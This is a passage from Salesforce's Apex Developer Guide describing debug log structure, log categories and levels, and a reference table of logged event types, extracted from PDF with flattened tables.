Warning:  If the debug log trace flag is enabled on a frequently accessed Apex class or for a user executing requests often,
the request can result in failure, regardless of the time window and the size of the debug logs.
•
When your org accumulates more than 1,000 MB of debug logs, we prevent users in the org from adding or editing trace flags. To
add or edit trace flags so that you can generate more logs after you reach the limit, delete some debug logs.
Inspecting the Debug Log Sections
After you generate a debug log, the type and amount of information listed depends on the filter values you set for the user. However,
the format for a debug log is always the same.
Note:  Session IDs are replaced with "SESSION_ID_REMOVED" in Apex debug logs
A debug log has the following sections.
666
Debugging ApexApex Developer Guide

Header
The header contains the following information.
•
The version of the API used during the transaction.
•
The log category and level used to generate the log. For example:
The following is an example of a header.
65.0
APEX_CODE,DEBUG;APEX_PROFILING,INFO;CALLOUT,INFO;DB,INFO;SYSTEM,DEBUG;VALIDATION,INFO;VISUALFORCE,INFO;
WORKFLOW,INFO
In this example, the API version is 65.0, and the following debug log categories and levels have been set.
DEBUGApex Code
INFOApex Profiling
INFOCallout
INFODatabase
DEBUGSystem
INFOValidation
INFOVisualforce
INFOWorkflow
Warning:  If the Apex Code log level is set to FINEST, the debug log includes details of all Apex variable assignments. Ensure
that the Apex Code being traced doesn’t handle sensitive data. Before enabling FINEST log level, be sure to understand the
level of sensitive data your organization's Apex handles. Be careful with processes such as community users self-registration
where user passwords can be assigned to an Apex string variable.
Execution Units
An execution unit is equivalent to a transaction. It contains everything that occurred within the transaction. EXECUTION_STARTED
and EXECUTION_FINISHED delimit an execution unit.
Code Units
A code unit is a discrete unit of work within a transaction. For example, a trigger is one unit of code, as is a webservice method
or a validation rule.
Note:  A class isn’t a discrete unit of code.
CODE_UNIT_STARTED and CODE_UNIT_FINISHED delimit units of code. Units of work can embed other units of work.
For example:
EXECUTION_STARTED
CODE_UNIT_STARTED|[EXTERNAL]execute_anonymous_apex
CODE_UNIT_STARTED|[EXTERNAL]MyTriggeron AccounttriggereventBeforeInsertfor
[new]|__sfdc_trigger/MyTrigger
CODE_UNIT_FINISHED<-- The triggerends
CODE_UNIT_FINISHED<-- The executeAnonymousends
EXECUTION_FINISHED
667
Debugging ApexApex Developer Guide

Units of code include, but aren’t limited to, the following:
•
Triggers
•
Workflow invocations and time-based workflow
•
Validation rules
•
Approval processes
•
Apex lead convert
•
@future method invocations
•
Web service invocations
•
executeAnonymous calls
•
Visualforce property access on Apex controllers
•
Visualforce actions on Apex controllers
•
Execution of the batch Apex start and finish methods, and each execution of the execute method
•
Execution of the Apex System.Scheduleexecute method
•
Incoming email handling
Log Lines
Log lines are included inside units of code and indicate which code or rules are being executed. Log lines can also be messages
written to the debug log.
Log lines are made up of a set of fields, delimited by a pipe (|). The format is:
•
timestamp: Consists of the time when the event occurred and a value between parentheses. The time is in the user’s time zone
and in the format HH:mm:ss.SSS. The value in parentheses represents the time elapsed in nanoseconds since the start of
the request. The elapsed time value is excluded from logs reviewed in the Developer Console when you use the Execution Log
view. However, you can see the elapsed time when you use the Raw Log view. To open the Raw Log view, from the Developer
Console’s Logs tab, right-click the name of a log and select Open Raw Log.
•
event identifier: Specifies the event that triggered the debug log entry (such as SAVEPOINT_RESET or VALIDATION_RULE).
Also includes additional information logged with that event, such as the method name or the line and character number where
the code was executed. If a line number can’t be located, [EXTERNAL] is logged instead. For example, [EXTERNAL] is
logged for built-in Apex classes or code that’s in a managed package.
For some events (CODE_UNIT_STARTED, CODE_UNIT_FINISHED, VF_APEX_CALL_START, VF_APEX_CALL_END,
CONSTRUCTOR_ENTRY, and CONSTRUCTOR_EXIT), the end of the event identifier includes a pipe (|) followed by a
typeRef for an Apex class or trigger.
For a trigger, the typeRef begins with the SFDC trigger prefix __sfdc_trigger/. For example,
__sfdc_trigger/YourTriggerName or __sfdc_trigger/YourNamespace/YourTriggerName.
For a class, the typeRef uses the format YourClass, YourClass$YourInnerClass,, or
YourNamespace/YourClass$YourInnerClass.
More Log Data
In addition, the log contains the following information.
•
Cumulative resource usage is logged at the end of many code units. Among these code units are triggers, executeAnonymous,
batch Apex message processing, @future methods, Apex test methods, Apex web service methods, and Apex lead convert.
•
Cumulative profiling information is logged once at the end of the transaction and contains information about DML invocations,
expensive queries, and so on. “Expensive” queries use resources heavily.
668
Debugging ApexApex Developer Guide

•
Heap usage is accurately reported in the debug log and an exception is thrown whenever an Apex Heap Size error occurs. At
other times, the heap size shown in the debug log is the largest heap size that was calculated during the transaction. To reduce
the overhead on small transactions, minimal heap usage doesn’t warrant an accurate calculation and is reported as 0(zero).
The following is an example debug log.
37.0APEX_CODE,FINEST;APEX_PROFILING,INFO;CALLOUT,INFO;DB,INFO;SYSTEM,DEBUG;
VALIDATION,INFO;VISUALFORCE,INFO;WORKFLOW,INFO
ExecuteAnonymous:System.debug('HelloWorld!');
16:06:58.18(18043585)|USER_INFO|[EXTERNAL]|005D0000001bYPN|devuser@example.org|
PacificStandardTime|GMT-08:00
16:06:58.18(18348659)|EXECUTION_STARTED
16:06:58.18(18383790)|CODE_UNIT_STARTED|[EXTERNAL]|execute_anonymous_apex
16:06:58.18(23822880)|HEAP_ALLOCATE|[72]|Bytes:3
16:06:58.18(24271272)|HEAP_ALLOCATE|[77]|Bytes:152
16:06:58.18(24691098)|HEAP_ALLOCATE|[342]|Bytes:408
16:06:58.18(25306695)|HEAP_ALLOCATE|[355]|Bytes:408
16:06:58.18(25787912)|HEAP_ALLOCATE|[467]|Bytes:48
16:06:58.18(26415871)|HEAP_ALLOCATE|[139]|Bytes:6
16:06:58.18(26979574)|HEAP_ALLOCATE|[EXTERNAL]|Bytes:1
16:06:58.18(27384663)|STATEMENT_EXECUTE|[1]
16:06:58.18(27414067)|STATEMENT_EXECUTE|[1]
16:06:58.18(27458836)|HEAP_ALLOCATE|[1]|Bytes:12
16:06:58.18(27612700)|HEAP_ALLOCATE|[50]|Bytes:5
16:06:58.18(27768171)|HEAP_ALLOCATE|[56]|Bytes:5
16:06:58.18(27877126)|HEAP_ALLOCATE|[64]|Bytes:7
16:06:58.18(49244886)|USER_DEBUG|[1]|DEBUG|HelloWorld!
16:06:58.49(49590539)|CUMULATIVE_LIMIT_USAGE
16:06:58.49(49590539)|LIMIT_USAGE_FOR_NS|(default)|
Numberof SOQLqueries:0 out of 100
Numberof queryrows:0 out of 50000
Numberof SOSLqueries:0 out of 20
Numberof DML statements:0 out of 150
Numberof DML rows:0 out of 10000
MaximumCPU time:0 out of 10000
Maximumheapsize:0 out of 6000000
Numberof callouts:0 out of 100
Numberof EmailInvocations:0 out of 10
Numberof futurecalls:0 out of 50
Numberof queueablejobsaddedto the queue:0 out of 50
Numberof MobileApexpushcalls:0 out of 10
16:06:58.49(49590539)|CUMULATIVE_LIMIT_USAGE_END
16:06:58.18(52417923)|CODE_UNIT_FINISHED|execute_anonymous_apex
16:06:58.18(54114689)|EXECUTION_FINISHED
Setting Debug Log Filters for Apex Classes and Triggers
To debug complex Apex logic, you can set Apex class and trigger trace flags, also known as debug log filters. For example, you can raise
the log verbosity for a given class while turning off logging for other classes or triggers. These trace flags have the debug log type
CLASS_TRACING and override the debug log levels of the USER_DEBUG and DEVELOPER_LOG trace flags.
For an explanation and an example of how Apex class and trigger trace flags work, see Debug Log Filtering for Apex Classes and Apex
Triggers in Salesforce Help.
669
Debugging ApexApex Developer Guide

For concrete instructions about how to configure debug log filters, see Set Up Apex Class and Trigger Trace Flags in Salesforce Help.
Working with Logs in the Developer Console
Use the Logs tab in the Developer Console to open debug logs.
Debugging Apex API Calls
Debug Log Order of Precedence
Which events are logged depends on various factors. These factors include your trace flags, the default logging levels, your API
header, user-based system log enablement, and the log levels set by your entry points.
SEE ALSO:
Salesforce Help: Set Up Debug Logging
Salesforce Help: View Debug Logs
Salesforce Help: Delete Debug Logs
Working with Logs in the Developer Console
Use the Logs tab in the Developer Console to open debug logs.
Logs open in Log Inspector. Log Inspector is a context-sensitive execution viewer in the Developer Console. It shows the source of an
operation, what triggered the operation, and what occurred next. Use this tool to inspect debug logs that include database events, Apex
processing, workflow, and validation logic.
To learn more about working with logs in the Developer Console, see Log Inspector in the Salesforce online help.
When using the Developer Console or monitoring a debug log, you can specify the level of information that gets included in the log.
Log category
The type of information logged, such as information from Apex or workflow rules.
Log level
The amount of information logged.
Event type
The combination of log category and log level that specify which events get logged. Each event can log additional information, such
as the line and character number where the event started, fields associated with the event, and duration of the event.
Debug Log Categories
Each debug level includes a debug log level for each of these log categories. The amount of information logged for each category
depends on the log level.
DescriptionLog Category
Includes information about database activity, including every data manipulation language
(DML) statement or inline SOQL or SOSL query.
Database
Logs rules and policy information for objects accessed from the UI, which can be used to
determine why an object isn’t accessible.
DatabaseAccess
Includes information for workflow rules, flows, and processes, such as the rule name and the
actions taken.
Workflow
670
Debugging ApexApex Developer Guide

DescriptionLog Category
Includes information about Einstein Next Best Action activity, including strategy execution
details from Strategy Builder.
NBA
Includes information about validation rules, such as the name of the rule and whether the
rule evaluated true or false.
Validation
Includes the request-response XML that the server is sending and receiving from an external
web service. Useful when debugging issues related to using Lightning Platform web service
API calls or troubleshooting user access to external objects via Salesforce Connect.
Callout
Includes information about Apex code. Can include information such as log messages
generated by DML statements, inline SOQL or SOSL queries, the start and completion of any
triggers, and the start and completion of any test method.
ApexCode
Includes cumulative profiling information, such as the limits for your namespace and the
number of emails sent.
ApexProfiling
Includes information about Visualforce events, including serialization and deserialization of
the view state or the evaluation of a formula field in a Visualforce page.
Visualforce
Includes information about calls to all system methods such as the System.debug
method.
System
Debug Log Levels
Each debug level includes one of these log levels for each log category. The levels are listed from lowest to highest. Specific events are
logged based on the combination of category and levels. Most events start being logged at the INFO level. The level is cumulative, that
is, if you select FINE, the log also includes all events logged at the DEBUG, INFO, WARN, and ERROR levels.
Note:  Not all levels are available for all categories. Only the levels that correspond to one or more events are available.
•
NONE
•
ERROR
•
WARN
•
INFO
•
DEBUG
•
FINE
•
FINER
•
FINEST
Important:  Before running a deployment, verify that the Apex Code log level isn’t set to FINEST. Otherwise, the deployment is
likely to take longer than expected. If the Developer Console is open, the log levels in the Developer Console affect all logs, including
logs created during a deployment.
Debug Event Types
This example shows what is written to the debug log. The event is USER_DEBUG. The format is timestamp | eventidentifier.
This example shows a debug log line.
671
Debugging ApexApex Developer Guide

Debug Log Line Example
•
timestamp: Consists of the time when the event occurred and a value between parentheses. The time is in the user’s time zone and
in the format HH:mm:ss.SSS. The value in parentheses represents the time elapsed in nanoseconds since the start of the request.
The elapsed time value is excluded from logs reviewed in the Developer Console when you use the Execution Log view. However,
you can see the elapsed time when you use the Raw Log view. To open the Raw Log view, from the Developer Console’s Logs tab,
right-click the name of a log and select Open Raw Log.
•
event identifier: Specifies the event that triggered the debug log entry, such as SAVEPOINT_RESET or VALIDATION_RULE.
Also includes additional information logged with that event, such as the method name or the line and character number where the
code was executed. If a line number can’t be located, [EXTERNAL] is logged instead. For example, [EXTERNAL] is logged for
built-in Apex classes or code that’s in a managed package.
For some events, such as CODE_UNIT_STARTED, CODE_UNIT_FINISHED, VF_APEX_CALL_START,
VF_APEX_CALL_END, CONSTRUCTOR_ENTRY, and CONSTRUCTOR_EXIT, the end of the event identifier includes a pipe
(|) followed by a typeRef for an Apex class or trigger.
For a trigger, the typeRef begins with the SFDC trigger prefix __sfdc_trigger/. For example,
__sfdc_trigger/YourTriggerName or __sfdc_trigger/YourNamespace/YourTriggerName.
For a class, the typeRef uses the format YourClass, YourClass$YourInnerClass, or
YourNamespace/YourClass$YourInnerClass.
In this example, the event identifier consists of:
•
Event name:
USER_DEBUG
•
Line number of the event in the code:
[2]
•
Logging level the System.Debug method was set to:
DEBUG
•
User-supplied string for the System.Debug method:
Helloworld!
This code snippet triggers this example log line.
672
Debugging ApexApex Developer Guide

Debug Log Line Code Snippet
This log line is recorded when the test reaches line 5 in the code.
15:51:01.071(55856000)|DML_BEGIN|[5]|Op:Insert|Type:Invoice_Statement__c|Rows:1
In this example, the event identifier consists of:
•
Event name:
DML_BEGIN
•
Line number of the event in the code:
[5]
•
DML operation type—Insert:
Op:Insert
•
Object name:
Type:Invoice_Statement__c
•
Number of rows passed into the DML operation:
Rows:1
These event types are logged. The table lists which fields or other information are logged with each event, and which combination of
log level and category causes an event to be logged.
Level
Logged
Category
Logged
Fields or Information Logged with EventEvent Name
FINESTApex CodeNumber of bytes allocatedBULK_HEAP_ALLOCATE
INFO and
above
CalloutLine number and request headersCALLOUT_REQUEST
INFO and
above
CalloutExternal endpoint and methodCALLOUT_REQUEST
(External object access via cross-org and OData
adapters for Salesforce Connect)
INFO and
above
CalloutLine number and response bodyCALLOUT_RESPONSE
INFO and
above
CalloutStatus and status codeCALLOUT_RESPONSE
673
Debugging ApexApex Developer Guide

Level
Logged
Category
Logged
Fields or Information Logged with EventEvent Name
(External object access via cross-org and OData
adapters for Salesforce Connect)
ERROR and
above
Apex CodeLine number, code unit name, such as MyTrigger
on Accounttriggerevent
BeforeInsertfor [new], and:
CODE_UNIT_FINISHED
•
For Apex methods, the namespace (if applicable),
class name, and method name; for example,
YourNamespace.YourClass.yourMethod()
or YourClass.yourMethod()
•
For Apex triggers, a typeRef; for example,
__sfdc_trigger/YourNamespace.YourTrigger
or __sfdc_trigger/YourTrigger
ERROR and
above
Apex CodeLine number, code unit name, such as MyTrigger
on Accounttriggerevent
BeforeInsertfor [new], and:
CODE_UNIT_STARTED
•
For Apex methods, the namespace (if applicable),
class name, and method name; for example,
YourNamespace.YourClass.yourMethod()
or YourClass.yourMethod()
•
For Apex triggers, a typeRef; for example,
__sfdc_trigger/YourTrigger
FINE and
above
Apex CodeLine number, Apex class ID, the string <init>()
with the types of parameters (if any) between the
parentheses, and a typeRef; for example,
CONSTRUCTOR_ENTRY
YourClass or
YourClass.YourInnerClass
FINE and
above
Apex CodeLine number, the string <init>() with the types
of parameters (if any) between the parentheses, and
a typeRef; for example, YourClass or
YourClass.YourInnerClass
CONSTRUCTOR_EXIT
INFO and
above
Apex
Profiling
NoneCUMULATIVE_LIMIT_USAGE
INFO and
above
Apex
Profiling
NoneCUMULATIVE_LIMIT_USAGE_END
FINE and
above
Apex
Profiling
NoneCUMULATIVE_PROFILING
FINE and
above
Apex
Profiling
NoneCUMULATIVE_PROFILING_BEGIN
674
Debugging ApexApex Developer Guide

Level
Logged
Category
Logged
Fields or Information Logged with EventEvent Name
FINE and
above
Apex
Profiling
NoneCUMULATIVE_PROFILING_END
FINEData AccessRequest and Response for the data access request.
Used regardless of the data space or policy being
accessed.
DATA_ACCESS_EVALUATION
INFO and
above
DBLine number, operation (such as Insert or
Update), record name or type, and number of rows
passed into DML operation
DML_BEGIN
INFO and
above
DBLine numberDML_END
INFO and
above
Apex CodeLine numberEMAIL_QUEUE
FINE and
above
Apex CodePackage namespaceENTERING_MANAGED_PKG
INFO and
above
WorkflowEvent TypeEVENT_SERVICE_PUB_BEGIN
FINER and
above
WorkflowSubscription IDs, ID of the user who published the
event, and event message data
EVENT_SERVICE_PUB_DETAIL
INFO and
above
WorkflowEvent TypeEVENT_SERVICE_PUB_END
INFO and
above
WorkflowEvent type and action (subscribe or unsubscribe)EVENT_SERVICE_SUB_BEGIN
FINER and
above
WorkflowID of the subscription, ID of the subscription instance,
reference data (such as process API name), ID of the
user who activated or deactivated the subscription,
and event message data
EVENT_SERVICE_SUB_DETAIL
INFO and
above
WorkflowEvent type and action (subscribe or unsubscribe)EVENT_SERVICE_SUB_END
INFO and
above
Apex CodeLine number, exception type, and messageEXCEPTION_THROWN
ERROR and
above
Apex CodeNoneEXECUTION_FINISHED
ERROR and
above
Apex CodeNoneEXECUTION_STARTED
ERROR and
above
Apex CodeException type, message, and stack traceFATAL_ERROR
675
Debugging ApexApex Developer Guide

Level
Logged
Category
Logged
Fields or Information Logged with EventEvent Name
FINER and
above
WorkflowInterview ID, element name, action type, action enum
or ID, whether the action call succeeded, and error
message
FLOW_ACTIONCALL_DETAIL
FINER and
above
WorkflowInterview ID, reference, operator, and valueFLOW_ASSIGNMENT_DETAIL
FINE and
above
WorkflowInterview ID and element typeFLOW_BULK_ELEMENT_BEGIN
FINER and
above
WorkflowInterview ID, element type, element name, number
of records
FLOW_BULK_ELEMENT_DETAIL
FINE and
above
WorkflowInterview ID, element type, element name, number
of records, and execution time
FLOW_BULK_ELEMENT_END
FINER and
above
WorkflowIncremented usage toward a limit for this bulk
element. Each event displays the usage for one of
these limits.
SOQLqueries
SOQLqueryrows
FLOW_BULK_ELEMENT_LIMIT_USAGE
SOSLqueries
DML statements
DML rows
CPU timein ms
Heapsizein bytes
Callouts
Emailinvocations
Futurecalls
Jobsin queue
Pushnotifications
INFO and
above
WorkflowOperation, element name, and entity name that
doesn’t support bulk operations
FLOW_BULK_ELEMENT_NOT_SUPPORTED
INFO and
above
WorkflowOrganization ID, definition ID, and version IDFLOW_CREATE_INTERVIEW_BEGIN
INFO and
above
WorkflowInterview ID and flow nameFLOW_CREATE_INTERVIEW_END
ERROR and
above
WorkflowMessage, organization ID, definition ID, and version
ID
FLOW_CREATE_INTERVIEW_ERROR
FINE and
above
WorkflowInterview ID, element type, and element nameFLOW_ELEMENT_BEGIN
FINE and
above
WorkflowElement type and element nameFLOW_ELEMENT_DEFERRED
FINE and
above
WorkflowInterview ID, element type, and element nameFLOW_ELEMENT_END
676
Debugging ApexApex Developer Guide

Level
Logged
Category
Logged
Fields or Information Logged with EventEvent Name
ERROR and
above
WorkflowMessage, element type, and element name (flow
runtime exception)
FLOW_ELEMENT_ERROR
ERROR and
above
WorkflowMessage, element type, and element name (spark not
found)
FLOW_ELEMENT_ERROR
ERROR and
above
WorkflowMessage, element type, and element name (designer
exception)
FLOW_ELEMENT_ERROR
ERROR and
above
WorkflowMessage, element type, and element name (designer
limit exceeded)
FLOW_ELEMENT_ERROR
ERROR and
above
WorkflowMessage, element type, and element name (designer
runtime exception)
FLOW_ELEMENT_ERROR
WARNING
and above
WorkflowMessage, element type, and element name (fault path
taken)
FLOW_ELEMENT_FAULT
FINER and
above
WorkflowIncremented usage toward a limit for this element.
Each event displays the usage for one of these limits.
SOQLqueries
SOQLqueryrows
FLOW_ELEMENT_LIMIT_USAGE
SOSLqueries
DML statements
DML rows
CPU timein ms
Heapsizein bytes
Callouts
Emailinvocations
Futurecalls
Jobsin queue
Pushnotifications
FINER and
above
WorkflowUsage toward a limit when the interview finishes. Each
event displays the usage for one of these limits.
SOQLqueries
SOQLqueryrows
FLOW_INTERVIEW_FINISHED_LIMIT_USAGE
SOSLqueries
DML statements
DML rows
CPU timein ms
Heapsizein bytes
Callouts
Emailinvocations
Futurecalls
Jobsin queue
Pushnotifications
INFO and
above
WorkflowInterview ID, flow name, and why the user pausedFLOW_INTERVIEW_PAUSED
677
Debugging ApexApex Developer Guide

Level
Logged
Category
Logged
Fields or Information Logged with EventEvent Name
INFO and
above
WorkflowInterview ID and flow nameFLOW_INTERVIEW_RESUMED
FINER and
above
WorkflowInterview ID, index, and value
The index is the position in the collection variable for
the item that the loop is operating on.
FLOW_LOOP_DETAIL
FINER and
above
WorkflowInterview ID, rule name, and resultFLOW_RULE_DETAIL
INFO and
above
WorkflowInterview ID and flow nameFLOW_START_INTERVIEW_BEGIN
INFO and
above
WorkflowInterview ID and flow nameFLOW_START_INTERVIEW_END
INFO and
above
WorkflowRequestsFLOW_START_INTERVIEWS_BEGIN
INFO and
above
WorkflowRequestsFLOW_START_INTERVIEWS_END
ERROR and
above
WorkflowMessage, interview ID, and flow nameFLOW_START_INTERVIEWS_ERROR
FINER and
above
WorkflowUsage toward a limit at the interview’s start time. Each
event displays the usage for one of these limits.
SOQLqueries
SOQLqueryrows
FLOW_START_INTERVIEW_LIMIT_USAGE
SOSLqueries
DML statements
DML rows
CPU timein ms
Heapsizein bytes
Callouts
Emailinvocations
Futurecalls
Jobsin queue
Pushnotifications
INFO and
above
WorkflowMessage and number of records that the flow runs
for
FLOW_START_SCHEDULED_RECORDS
FINER and
above
WorkflowInterview ID, name, definition ID, and version IDFLOW_SUBFLOW_DETAIL
FINER and
above
WorkflowInterview ID, key, and valueFLOW_VALUE_ASSIGNMENT
FINER and
above
WorkflowInterview ID, element name, event name, and event
type
FLOW_WAIT_EVENT_RESUMING_DETAIL
678
Debugging ApexApex Developer Guide

Level
Logged
Category
Logged
Fields or Information Logged with EventEvent Name
FINER and
above
WorkflowInterview ID, element name, event name, event type,
and whether conditions were met
FLOW_WAIT_EVENT_WAITING_DETAIL
FINER and
above
WorkflowInterview ID, element name, and persisted interview
ID
FLOW_WAIT_RESUMING_DETAIL
FINER and
above
WorkflowInterview ID, element name, number of events that
the element is waiting for, and persisted interview ID
FLOW_WAIT_WAITING_DETAIL
FINER and
above
Apex CodeLine number and number of bytesHEAP_ALLOCATE
FINER and
above
Apex CodeLine number and number of bytes deallocatedHEAP_DEALLOCATE
FINESTDBLine numberIDEAS_QUERY_EXECUTE
FINESTApex
Profiling
Namespace and these limits:
Numberof SOQLqueries
LIMIT_USAGE_FOR_NS
Numberof queryrows
Numberof SOSLqueries
Numberof DML statements
Numberof DML rows
Numberof codestatements
Maximumheapsize
Numberof callouts
Numberof EmailInvocations
Numberof fieldsdescribes
Numberof recordtypedescribes
Numberof childrelationships
describes
Numberof picklistdescribes
Numberof futurecalls
Numberof findsimilarcalls
Numberof System.runAs()
679
Debugging ApexApex Developer Guide

Level
Logged
Category
Logged
Fields or Information Logged with EventEvent Name
invocations
FINE and
above
Apex CodeLine number, the Lightning Platform ID of the class,
and method signature (with namespace, if applicable)
METHOD_ENTRY
FINE and
above
Apex CodeLine number, the Lightning Platform ID of the class,
and method signature (with namespace, if applicable)
For constructors, this information is logged: line
number and class name.
METHOD_EXIT
INFO and
above
CalloutNamed Credential Id, Named Credential Name,
Endpoint, Method, External Credential Type, Http
Header Authorization, Request Size bytes, and Retry
on 401.
If using an outbound network connection, these fields
are also logged: Outbound Network Connection Id,
NAMED_CREDENTIAL_REQUEST
Outbound Network Connection Name, Outbound
Network Connection Status, Host Type, Host Region,
and Private Connect Outbound Hourly Data Usage
Percent.
INFO and
above
CalloutTruncated section of the response body that’s
returned from the NamedCredential callout.
NAMED_CREDENTIAL_RESPONSE
FINER and
above
CalloutNamed Credential Id, Named Credential Name, Status
Code, Response Size bytes, Overall Callout Time ms,
and Connect Time ms.
If using an outbound network connection, these fields
are also logged: Outbound Network Connection Id,
NAMED_CREDENTIAL_RESPONSE_DETAIL
Outbound Network Connection Name, and Private
Connect Outbound Hourly Data Usage Percent.
FINE and
above
NBAElement name, element typeNBA_NODE_BEGIN
FINE and
above
NBAElement name, element type, messageNBA_NODE_DETAIL
FINE and
above
NBAElement name, element type, messageNBA_NODE_END
ERROR and
above
NBAElement name, element type, error messageNBA_NODE_ERROR
FINE and
above
NBAName, ID, reasonNBA_OFFER_INVALID
680
Debugging ApexApex Developer Guide

Level
Logged
Category
Logged
Fields or Information Logged with EventEvent Name
FINE and
above
NBAStrategy nameNBA_STRATEGY_BEGIN
FINE and
above
NBAStrategy name, count of outputsNBA_STRATEGY_END
ERROR and
above
NBAStrategy name, error messageNBA_STRATEGY_ERROR
FINERData AccessCondition evaluation response for a policy. Used for
identifying conditions that match the policy.
POLICY_RULE_DEFINITION_CONDITION_EVALUATION_RESPONSE
FINEData AccessRequest received for the evaluation of access via the
policy.
POLICY_RULE_EVALUATION_REQUEST
FINERData AccessResponse for the evaluation of access via the policy,
including why access is granted or denied.
POLICY_RULE_EVALUATION_RESPONSE
FINERData AccessObject for which the policy evaluation is skipped. If
the policy evaluation is skipped, the user is allowed
access to the object.
POLICY_RULE_EVALUATION_SKIPPED
FINERData AccessRule being evaluated.POLICY_RULE_EVALUATION_START
INFO and
above
SystemLine number, the Lightning Platform ID of the class
or trigger that has its log levels set and that is going
into scope, the name of this class or trigger, and the
POP_TRACE_FLAGS
log level settings that are in effect after leaving this
scope
ERRORApex CodeApp namespace, app name
This event occurs when Apex code is trying to send
a notification to an app that doesn't exist in the org,
or isn’t push-enabled.
PUSH_NOTIFICATION_INVALID_APP
ERRORApex CodeApp namespace, app name
This event indicates that the certificate is invalid. For
example, it’s expired.
PUSH_NOTIFICATION_INVALID_CERTIFICATE
ERRORApex CodeApp namespace, app name, service type (Apple or
Android GCM), user ID, device, payload (substring),
payload length.
This event occurs when a notification payload is too
long.
PUSH_NOTIFICATION_INVALID_NOTIFICATION
DEBUGApex CodeApp namespace, app name
This event occurs when none of the users we’re trying
to send notifications to have devices registered.
PUSH_NOTIFICATION_NO_DEVICES
681
Debugging ApexApex Developer Guide

Level
Logged
Category
Logged
Fields or Information Logged with EventEvent Name
INFOApex Code
This event occurs when push notifications aren’t
enabled in your org.
PUSH_NOTIFICATION_NOT_ENABLED
DEBUGApex CodeApp namespace, app name, service type (Apple or
Android GCM), user ID, device, payload (substring)
This event records that a notification was accepted
for sending. We don’t guarantee delivery of the
notification.
PUSH_NOTIFICATION_SENT
INFO and
above
SystemLine number, the Salesforce ID of the class or trigger
that has its log levels set and that is going out of
scope, the name of this class or trigger, and the log
level settings that are in effect after entering this scope
PUSH_TRACE_FLAGS
INFO and
above
DBLine numberQUERY_MORE_BEGIN
INFO and
above
DBLine numberQUERY_MORE_END
INFO and
above
DBLine number and the number of queryMore
iterations
QUERY_MORE_ITERATIONS
INFO and
above
DBLine number and Savepoint nameSAVEPOINT_ROLLBACK
INFO and
above
DBLine number and Savepoint nameSAVEPOINT_SET
INFO and
above
WorkflowNumber of cases, load time, processing time, number
of case milestones to insert, update, or delete, and
new trigger
SLA_END
INFO and
above
WorkflowMilestone IDSLA_EVAL_MILESTONE
INFO and
above
WorkflowNoneSLA_NULL_START_DATE
INFO and
above
WorkflowCase IDSLA_PROCESS_CASE
INFO and
above
DBLine number, number of aggregations, and query
source
SOQL_EXECUTE_BEGIN
INFO and
above
DBLine number, number of rows, and duration in
milliseconds
SOQL_EXECUTE_END
FINESTDBQuery Plan details for the executed SOQL query. To
get feedback on query performance, see Get Feedback
on Query Performance.
SOQL_EXECUTE_EXPLAIN
682
Debugging ApexApex Developer Guide

Level
Logged
Category
Logged
Fields or Information Logged with EventEvent Name
INFO and
above
DBLine number and query sourceSOSL_EXECUTE_BEGIN
INFO and
above
DBLine number, number of rows, and duration in
milliseconds
SOSL_EXECUTE_END
FINE and
above
Apex
Profiling
Frame number and variable list of the form:
Variablenumber | Value. For example:
var1:50
var2:'HelloWorld'
STACK_FRAME_VARIABLE_LIST
FINER and
above
Apex CodeLine numberSTATEMENT_EXECUTE
FINE and
above
Apex
Profiling
Variable list of the form: Variablenumber |
Value. For example:
var1:50
var2:'HelloWorld'
STATIC_VARIABLE_LIST
FINE and
above
SystemLine number and the string <init>() with the
types of parameters, if any, between the parentheses
SYSTEM_CONSTRUCTOR_ENTRY
FINE and
above
SystemLine number and the string <init>() with the
types of parameters, if any, between the parentheses
SYSTEM_CONSTRUCTOR_EXIT
FINE and
above
SystemLine number and method signatureSYSTEM_METHOD_ENTRY
FINE and
above
SystemLine number and method signatureSYSTEM_METHOD_EXIT
INFO and
above
SystemMode nameSYSTEM_MODE_ENTER
INFO and
above
SystemMode nameSYSTEM_MODE_EXIT
INFO and
above
Apex
Profiling
NoneTESTING_LIMITS
FINE and
above
Apex
Profiling
Number of emails sentTOTAL_EMAIL_RECIPIENTS_QUEUED
DEBUG and
above by
Apex CodeLine number, logging level, and user-supplied stringUSER_DEBUG
default. If the
user sets the
log level for
683
Debugging ApexApex Developer Guide

Level
Logged
Category
Logged
Fields or Information Logged with EventEvent Name
the
System.Debug
method, the
event is
logged at
that level
instead.
ERROR and
above
Apex CodeLine number, user ID, username, user timezone, and
user timezone in GMT
USER_INFO
INFO and
above
ValidationError messageVALIDATION_ERROR
INFO and
above
ValidationNoneVALIDATION_FAIL
INFO and
above
ValidationFormula source and valuesVALIDATION_FORMULA
INFO and
above
ValidationNoneVALIDATION_PASS
INFO and
above
ValidationRule nameVALIDATION_RULE
FINESTApex CodeLine number, variable name (including the variable’s
namespace, if applicable), a string representation of
the variable’s value, and the variable’s address
VARIABLE_ASSIGNMENT
FINESTApex CodeLine number, variable name (including the variable’s
namespace, if applicable), type, a value that indicates
VARIABLE_SCOPE_BEGIN
whether the variable can be referenced, and a value
that indicates whether the variable is static
FINESTApex CodeNoneVARIABLE_SCOPE_END
INFO and
above
Apex CodeElement name, method name, return type, and the
typeRef for the Visualforce controller (for example,
YourApexClass)
VF_APEX_CALL_START
INFO and
above
Apex CodeElement name, method name, return type, and the
typeRef for the Visualforce controller (for example,
YourApexClass)
VF_APEX_CALL_END
INFO and
above
VisualforceView state IDVF_DESERIALIZE_VIEWSTATE_BEGIN
INFO and
above
VisualforceNoneVF_DESERIALIZE_VIEWSTATE_END
684
Debugging ApexApex Developer Guide

Level
Logged
Category
Logged
Fields or Information Logged with EventEvent Name
FINER and
above
VisualforceView state ID and formulaVF_EVALUATE_FORMULA_BEGIN
FINER and
above
VisualforceNoneVF_EVALUATE_FORMULA_END
INFO and
above
Apex CodeMessage textVF_PAGE_MESSAGE
INFO and
above
VisualforceView state IDVF_SERIALIZE_VIEWSTATE_BEGIN
INFO and
above
VisualforceNoneVF_SERIALIZE_VIEWSTATE_END
INFO and
above
WorkflowAction descriptionWF_ACTION
INFO and
above
WorkflowTask subject, action ID, rule name, rule ID, owner, and
due date
WF_ACTION_TASK
INFO and
above
WorkflowSummary of actions performedWF_ACTIONS_END
INFO and
above
WorkflowTransition type, EntityName:NameField
Id, and process node name
WF_APPROVAL
INFO and
above
WorkflowEntityName:NameFieldIdWF_APPROVAL_REMOVE
INFO and
above
WorkflowEntityName:NameFieldIdWF_APPROVAL_SUBMIT
INFO and
above
WorkflowSubmitter ID, submitter full name, and error messageWF_APPROVAL_SUBMITTER
INFO and
above
WorkflowOwner and assignee template IDWF_ASSIGN
INFO and
above
